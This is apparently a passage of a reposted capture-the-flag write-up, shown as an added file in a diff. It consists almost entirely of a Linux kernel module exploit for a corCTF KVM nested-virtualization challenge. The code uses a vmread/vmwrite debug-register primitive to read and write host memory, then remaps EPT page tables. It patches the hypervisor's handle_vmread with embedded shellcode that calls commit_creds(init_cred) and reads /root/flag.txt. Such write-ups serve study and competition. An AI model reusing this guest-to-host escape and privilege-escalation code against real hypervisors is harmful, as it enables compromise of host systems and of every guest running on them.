+static struct proc_ops fops = {
+    .proc_open = proc_open,
+    .proc_read = proc_read,
+    .proc_write = proc_write,
+};
+
+#else
+
+static struct file_operations fops = {
+    .owner = THIS_MODULE,
+    .open = proc_open,
+    .read = proc_read,
+    .write = proc_write,
+};
+
+#endif
+
+const char kvm_dat[] = "\x0f\x78\xc6\x3e";
+
+/*
+    push rax
+    push rbx
+    push rcx
+    push rdx
+    push r9
+    push r10
+    push r11
+    push r12
+    push r13
+    push r14
+    push rdi
+    push rsi
+
+    // get kaslr base
+    mov rax, 0xfffffe0000000004
+    mov rax, [rax]
+    sub rax, 0x1008e00
+
+    // r12 is kaslr_base
+    mov r12, rax
+
+    // commit_creds
+    mov r13, r12
+    add r13, 0xbdad0
+
+    // init_cred
+    mov r14, r12
+    add r14, 0x1a52ca0
+
+    mov rdi, r14
+    call r13
+
+    // filp_open
+    mov r11, r12
+    add r11, 0x292420
+
+    // push /root/flag.txt
+    mov rax, 0x7478742e6761
+    push rax
+    mov rax, 0x6c662f746f6f722f
+    push rax
+    mov rdi, rsp
+
+    // O_RDONLY
+    mov rsi, 0
+
+    call r11
+
+    // r10 is filp_ptr
+    mov r10, rax
+
+    // kernel_read
+    mov r11, r12
+    add r11, 0x294c70
+
+    // writeable kernel address
+    mov r9, r12
+    add r9, 0x18ab000
+
+    mov rdi, r10
+    mov rsi, r9
+    mov rdx, 0x100
+    mov rcx, 0
+
+    call r11
+
+    pop rax
+    pop rax
+
+    pop rsi
+    pop rdi
+    pop r13
+    pop r14
+    pop r12
+    pop r11
+    pop r10
+    pop r9
+    pop rdx
+    pop rcx
+    pop rbx
+    pop rax
+*/
+
+const uint8_t shellcode[] = "\x50\x53\x51\x52\x41\x51\x41\x52\x41\x53\x41\x54\x41\x55\x41\x56\x57\x56\x48\xb8\x04\x00\x00\x00\x00\xfe\xff\xff\x48\x8b\x00\x48\x2d\x00\x8e\x00\x01\x49\x89\xc4\x4d\x89\xe5\x49\x81\xc5\xd0\xda\x0b\x00\x4d\x89\xe6\x49\x81\xc6\xa0\x2c\xa5\x01\x4c\x89\xf7\x41\xff\xd5\x4d\x89\xe3\x49\x81\xc3\x20\x24\x29\x00\x48\xb8\x61\x67\x2e\x74\x78\x74\x00\x00\x50\x48\xb8\x2f\x72\x6f\x6f\x74\x2f\x66\x6c\x50\x48\x89\xe7\x48\xc7\xc6\x00\x00\x00\x00\x41\xff\xd3\x49\x89\xc2\x4d\x89\xe3\x49\x81\xc3\x70\x4c\x29\x00\x4d\x89\xe1\x49\x81\xc1\x00\xb0\x8a\x01\x4c\x89\xd7\x4c\x89\xce\x48\xc7\xc2\x00\x01\x00\x00\x48\xc7\xc1\x00\x00\x00\x00\x41\xff\xd3\x58\x58\x5e\x5f\x41\x5d\x41\x5e\x41\x5c\x41\x5b\x41\x5a\x41\x59\x5a\x59\x5b\x58";
+
+uint64_t vmxon_page_pa, vmptrld_page_pa;
+
+static __always_inline unsigned long long native_get_debugreg(int regno)
+{
+    unsigned long val = 0;    /* Damn you, gcc! */
+
+    switch (regno) {
+    case 0:
+        asm("mov %%db0, %0" :"=r" (val));
+        break;
+    case 1:
+        asm("mov %%db1, %0" :"=r" (val));
+        break;
+    case 2:
+        asm("mov %%db2, %0" :"=r" (val));
+        break;
+    case 3:
+        asm("mov %%db3, %0" :"=r" (val));
+        break;
+    case 6:
+        asm("mov %%db6, %0" :"=r" (val));
+        break;
+    case 7:
+        asm("mov %%db7, %0" :"=r" (val));
+        break;
+    default:
+        BUG();
+    }
+    return val;
+}
+
+static __always_inline void native_set_debugreg(int regno, unsigned long value)
+{
+    switch (regno) {
+    case 0:
+        asm("mov %0, %%db0"    ::"r" (value));
+        break;
+    case 1:
+        asm("mov %0, %%db1"    ::"r" (value));
+        break;
+    case 2:
+        asm("mov %0, %%db2"    ::"r" (value));
+        break;
+    case 3:
+        asm("mov %0, %%db3"    ::"r" (value));
+        break;
+    case 6:
+        asm("mov %0, %%db6"    ::"r" (value));
+        break;
+    case 7:
+        asm("mov %0, %%db7"    ::"r" (value));
+        break;
+    default:
+        BUG();
+    }
+}
+
+static noinline uint64_t read_cr3(void) {
+    uint64_t val = 0;
+        asm("mov %%cr3, %0" :"=r" (val));
+    return val;
+}
+
+static noinline uint64_t read_guy(unsigned long offset) {
+    uint64_t val = 0;
+
+    uint64_t vmread_field = 0;
+    uint64_t vmread_value = 0;
+
+    native_set_debugreg(0, 0x1337babe);
+    native_set_debugreg(1, offset);
+    asm volatile( "vmread %[field], %[output]\n\t"
+              : [output] "=r" (vmread_value)
+              : [field] "r" (vmread_field) : );
+    val = native_get_debugreg(2);
+
+    return val;
+}
+
+static noinline void write_guy(unsigned long offset, unsigned long value) {
+    uint64_t vmwrite_field = 0;
+    uint64_t vmwrite_value = 0;
+
+    native_set_debugreg(0, 0x1337babe);
+    native_set_debugreg(1, offset);
+    native_set_debugreg(2, value);
+    asm volatile( "vmwrite %[value], %[field]\n\t"
+          :
+          : [field] "r" (vmwrite_field),
+            [value] "r" (vmwrite_value) : );
+}
+
+#define IDT_BASE 0xfffffe0000000000ull
+
+static noinline int find_l1_vmcs(uint64_t *l1_vmcs_offset) {
+    unsigned long long pos_offset = 0, neg_offset = 0;
+    uint64_t zero_val = 0, pos_val = 0, neg_val = 0;
+    uint64_t found_val = 0, found_offset = 0;
+    uint64_t i = 0;
+
+    zero_val = read_guy(0ull);
+    pr_info("vmcs12[0] = %llx\n", zero_val);
+
+    // scan in each direction looking for the guest_idtr_base field of the l1 vm
+    for (i = 0; i < 0x4000; i++) {
+        // from attaching to the l1 guest, the address of guest_idtr_base always has 0x208 in the lower 3 nibbles
+        pos_offset = ((i * 0x1000) + 0x208) / 8;
+        neg_offset = ((i * -1 * 0x1000) + 0x208) / 8;
+
+        pos_val = read_guy(pos_offset);
+        if (pos_val == IDT_BASE) {
+            found_val = pos_val;
+            found_offset = pos_offset;
+            break;
+        }
+
+        neg_val = read_guy(neg_offset);
+        if (neg_val == IDT_BASE) {
+            found_val = neg_val;
+            found_offset = neg_offset;
+            break;
+        }
+
+        if (i < 0x20) {
+            pr_info("vmcs12[%llx * 8] = %llx\n", pos_offset, pos_val);
+            pr_info("vmcs12[%llx * 8] = %llx\n", neg_offset, neg_val);
+        }
+    }
+    if (found_val == 0) {
+        pr_info("[exp]: IDT NOT FOUND :(\n");
+        *l1_vmcs_offset = 0;
+        return 0;
+    } else {
+        pr_info("[exp]: Found IDT in l1 at offset %lld; value: %llx\n", found_offset, found_val);
+        *l1_vmcs_offset = found_offset;
+        return 1;
+    }
+}
+
+static noinline int find_nested_vmx(uint64_t *nested_vmx_offset) {
+    // the nested_vmx struct contains two known values --
+    //     the guest phys addrs of the vmxon_ptr and current_vmptr
+    // finding this structure allows us to read the `cached_vmcs12` pointer
+    // which is the host virtual address of our vmcs, based on that we can
+    // figure out where we are at in the l1's virtual address space
+
+    unsigned long long pos_offset = 0, neg_offset = 0;
+    uint64_t zero_val = 0, pos_val = 0, neg_val = 0;
+    uint64_t found_val = 0, found_offset = 0;
+    uint64_t i = 0;
+
+    zero_val = read_guy(0ull);
+    pr_info("vmcs12[0] = %llx\n", zero_val);
+    zero_val = read_guy(1ull);
+    pr_info("vmcs12[1] = %llx\n", zero_val);
+    zero_val = read_guy(0ull);
+    pr_info("vmcs12[0] = %llx\n", zero_val);
+
+    for (i = 1; i < (0x4000*0x200); i += 2) {
+        pos_offset = i;
+        neg_offset = -i;
+        // seen: 0xe8 0x28 0x68
+
+        pos_val = read_guy(pos_offset);
+        if (pos_val == vmptrld_page_pa && read_guy(pos_offset-2) == vmxon_page_pa) {
+            found_val = pos_val;
+            found_offset = pos_offset;
+            break;
+        }
+
+        // in practice negative offset is rare/impossible?
+        // commented out bc it keeps going too far and crashing
+        //neg_val = read_guy(neg_offset);
+        //if (neg_val == vmptrld_page_pa && read_guy(neg_offset-2) == vmxon_page_pa) {
+        //    found_val = neg_val;
+        //    found_offset = neg_offset;
+        //    break;
+        //}
+
+        if (i > 0x1000 && i < 0x2000) {
+            pr_info("vmcs12[%llx * 8] = %llx\n", pos_offset, pos_val);
+            //pr_info("vmcs12[%llx * 8] = %llx\n", neg_offset, neg_val);
+        }
+    }
+    if (found_val == 0) {
+        pr_info("[exp]: L1 VMCS NOT FOUND :(\n");
+        *nested_vmx_offset = 0;
+        return 0;
+    } else {
+        pr_info("[exp]: Found vmcs in l1 at offset %lld; value: %llx\n", found_offset, found_val);
+        *nested_vmx_offset = found_offset;
+        return 1;
+    }
+}
+
+static int proc_open(struct inode *inode, struct file *filep) {
+    uint64_t l1_vmcs_offset = 0;
+    uint64_t nested_vmx_offset = 0;
+    uint64_t l2_vmcs_addr = 0;
+
+    uint64_t eptp_value = 0;
+    uint64_t ept_offset = 0;
+    uint64_t ept_addr = 0;
+
+    uint64_t pml4e_value = 0;
+    uint64_t pml4e_offset = 0;
+    uint64_t pml4e_addr = 0;
+
+    uint64_t *pgde_page = 0;
+    uint64_t pgde_page_pa = 0;
+
+    uint64_t l2_entry = 0;
+
+    uint64_t physbase = 0;
+    uint64_t cr3 = 0;
+    uint64_t *pgd = 0;
+
+    uint64_t handle_vmread_page = 0;
+    uint8_t *handle_vmread = 0;
+
+    uint64_t i;
+
+    if (!find_l1_vmcs(&l1_vmcs_offset)) {
+        return 0; // not found
+    }
+
+    if (!find_nested_vmx(&nested_vmx_offset)) {
+        return 0; // not found
+    }
+
+    l2_vmcs_addr = read_guy(nested_vmx_offset+1);
+    pr_info("[exp]: YOU ARE HERE: %llx\n", l2_vmcs_addr);
+
+    physbase = l2_vmcs_addr & ~0xfffffffull;
+    pr_info("[exp]: probably physbase: %llx\n", l2_vmcs_addr & ~0xfffffff);
+
+    eptp_value = read_guy(l1_vmcs_offset-50);
+    pr_info("[exp]: eptp_value: %llx\n", eptp_value);
+
+    ept_addr = physbase + (eptp_value & ~0xfffull);
+    pr_info("[exp]: ept_addr: %llx\n", ept_addr);
+
+    ept_offset = (ept_addr-l2_vmcs_addr) / 8;
+    pr_info("[exp]: ept_offset: %llx\n", ept_offset);
+
+    // read first entry in ept to get the PML4E
+    pml4e_value = read_guy(ept_offset);
+    pr_info("[exp]: pml4e_value: %llx\n", pml4e_value);
+
+    pml4e_addr = physbase + (pml4e_value & ~0xfffull);
+    pr_info("[exp]: pml4e_addr: %llx\n", pml4e_addr);
+
+    pml4e_offset = (pml4e_addr-l2_vmcs_addr) / 8;
+    pr_info("[exp]: pml4e_offset: %llx\n", pml4e_offset);
+
+    // at 6GB will be an identity mapping of the l1 memory in l2
+    write_guy(pml4e_offset + 6, 0x987);
+
+    cr3 = read_cr3();
+    pgd = (cr3 & ~0xfffull) + page_offset_base;
+    pr_info("[exp]: pgd: %llx\n", pgd);
+
+    pgde_page = kzalloc(0x1000, GFP_KERNEL);
+    pgde_page_pa = virt_to_phys(pgde_page);
+
+    // sticking the l1 mapping at the PGD entry the LDT remap usually goes at cuz why not
+    pgd[272] = pgde_page_pa | 0x7;
+
+    // huge and rwxp
+    l2_entry = 0x180000000 | (1<<7) | 0x3;
+
+    pgde_page[0] = l2_entry;
+
+    // in THEORY I can access memory at 0xffff880000000000 now
+    pr_info("TEST: %llx\n", *((uint64_t *)0xffff880000000000));
+
+    // look for 0x3ec6780f to find the page where handle_vmread is at
+    for (i = 0; i < (1024ull << 20); i += 0x1000) {
+        unsigned int val = *((unsigned int *)(0xffff880000000df8 + i));
+
+        // check the value and check if relocations were applied
+        if (val == 0x3ec6780f && *((unsigned int *)(0xffff880000000df8 + 0xb + i)) != 0) {
+            handle_vmread_page = 0xffff880000000000 + i;
+            break;
+        }
+    }
+
+    pr_info("found handle_vmread page at: %llx\n", handle_vmread_page);
+
+    handle_vmread = handle_vmread_page + 0x4d0;
+    pr_info("handle_vmread at: %llx\n", handle_vmread);
+
+    // I don't want to figure out the address of nested_vmx_succeeded so pad with nops just up to that call
+    // and make the instruction just after nested_vmx_succeeded returns be ret
+    memset(handle_vmread, 0x90, 0x281);
+    handle_vmread[0x286] = 0xc3;
+
+    // -1 to remove null terminator
+    memcpy(handle_vmread, shellcode, sizeof(shellcode)-1);
+
+    // do it
+    read_guy(0);
+
+    // scan for flag in memory
+    for (i = 0; i < 1024ull << 20; i+= 0x1000) {
+        if (!memcmp(0xffff880000000000 + i, "corctf{", 7)) {
+            pr_info("flag: %s\n", 0xffff880000000000 + i);
+            break;
+        }
+    }
+
+    return 0;
+}
+
+static ssize_t proc_read(struct file* filep, char* __user buffer, size_t len, loff_t* offset) {
+    return 0;
+}
+
+static ssize_t proc_write(struct file* filep, const char* __user u_buffer, size_t len, loff_t* offset) {
+    return 0;
+}
+
+void __no_profile native_write_cr4(unsigned long val)
+{
+        unsigned long bits_changed = 0;
+        asm volatile("mov %0,%%cr4": "+r" (val) : : "memory");
+}
+
+static inline int vmxon(uint64_t phys)
+{
+        uint8_t ret;
+
+        __asm__ __volatile__ ("vmxon %[pa]; setna %[ret]"
+                : [ret]"=rm"(ret)
+                : [pa]"m"(phys)
+                : "cc", "memory");
+
+        return ret;
+}
+
+static inline int vmptrld(uint64_t vmcs_pa)
+{
+        uint8_t ret;
+
+        __asm__ __volatile__ ("vmptrld %[pa]; setna %[ret]"
+                : [ret]"=rm"(ret)
+                : [pa]"m"(vmcs_pa)
+                : "cc", "memory");
+
+        return ret;
+}
+
+
+static inline uint64_t rdmsr_guy(uint32_t msr)
+{
+    uint32_t a, d;
+
+    __asm__ __volatile__("rdmsr" : "=a"(a), "=d"(d) : "c"(msr) : "memory");
+
+    return a | ((uint64_t) d << 32);
+}
+
+
+static inline uint32_t vmcs_revision(void)
+{
+    return rdmsr_guy(MSR_IA32_VMX_BASIC);
+}
+
+static int __init proc_init(void)
+{
+    void *vmxon_page, *vmptrld_page;
+    struct proc_dir_entry *new;
+    unsigned long cr4;
+    int res;
+
+    cr4 = native_read_cr4();
+    cr4 |= 1ul << 13;
+    native_write_cr4(cr4);
+
+    pr_info("[exp]: set cr4 to %lx", cr4);
+    vmxon_page = kzalloc(0x1000, GFP_KERNEL);
+    vmptrld_page = kzalloc(0x1000, GFP_KERNEL);
+
+    vmxon_page_pa = virt_to_phys(vmxon_page);
+    vmptrld_page_pa = virt_to_phys(vmptrld_page);
+
+    *(uint32_t *)(vmxon_page) = vmcs_revision();
+    *(uint32_t *)(vmptrld_page) = vmcs_revision();
+
+    res = vmxon(vmxon_page_pa);
+    pr_info("[exp]: vmxon returned %d", res);
+
+    res = vmptrld(vmptrld_page_pa);
+    pr_info("[exp]: vmptrld returned %d", res);
+
+    pr_info("[exp]: vmxon_pa %llx", vmxon_page_pa);
+    pr_info("[exp]: vmptrld_pa %llx", vmptrld_page_pa);
+
+    pr_info("page_offset_base: %lx\n", page_offset_base);
+
+    new = proc_create("exp", 0777, NULL, &fops);
+    pr_info("[exp]: init\n");
+    return 0;
+}
+
+static void __exit proc_exit(void)
+{
+    remove_proc_entry("exp", NULL);
+    pr_info("exp: exit\n");
+}
+
+module_init(proc_init);
+module_exit(proc_exit);
+
+MODULE_LICENSE("GPL");
+MODULE_AUTHOR("zolutal");
+MODULE_DESCRIPTION("bleh");
+MODULE_VERSION("0.1");
+```
+
+![图片](./assets/csdn-140787240/image-017-530b1ccdd7.png)
+{% endraw %}
